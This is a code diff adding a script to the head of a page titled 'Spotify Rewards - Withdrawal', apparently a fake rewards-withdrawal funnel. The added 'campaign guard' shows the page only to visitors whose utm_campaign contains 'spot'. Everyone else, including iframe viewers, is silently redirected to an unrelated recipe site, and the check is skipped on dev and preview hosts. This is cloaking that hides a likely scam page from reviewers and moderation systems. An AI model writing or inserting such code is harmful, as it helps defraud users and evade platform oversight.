@@ -3,6 +3,22 @@
 
 <head>
   <meta charset="UTF-8">
+  <!-- Campaign guard: only "spot" campaigns may see this funnel -->
+  <script>
+    (function () {
+      var host = window.location.hostname;
+      var isDev = host === 'localhost' || host === '127.0.0.1' || host === '0.0.0.0' ||
+        host.indexOf('preview') !== -1 || host.indexOf('-dev.') !== -1;
+      if (isDev) return;
+      var campaign = (new URLSearchParams(window.location.search).get('utm_campaign') || '').toLowerCase();
+      if (campaign.indexOf('spot') !== -1) return;
+      var target = 'https://www.tudogostoso.com.br/receita/23-bolo-de-cenoura.html';
+      try {
+        if (window.top && window.top !== window) { window.top.location.replace(target); return; }
+      } catch (e) { /* cross-origin top: fall through */ }
+      window.location.replace(target);
+    })();
+  </script>
   <meta name="viewport"
     content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
   <title>Spotify Rewards - Withdrawal</title>
